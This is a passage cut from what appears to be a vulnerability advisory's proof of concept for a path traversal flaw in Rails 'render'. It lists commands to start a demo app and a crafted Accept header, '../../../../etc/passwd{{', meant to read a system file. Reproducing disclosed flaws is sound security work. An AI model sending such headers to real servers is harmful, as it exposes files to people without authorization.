file contents. 

> The impact is limited to calls to `render` which render file contents without

### Proof Of Concept

1. Run the vulnerable application inside the demo folder:

```console
foo@bar:~$ cd demo/
foo@bar:~$ bundle install
[...]
foo@bar:~$ rails s                                                                                                                12:59:54

2. Go to the route `/chybeta`
3. Intercept with burp the request and replace the `Accept` header with `Accept: ../../../../../../../../../../etc/passwd{{`
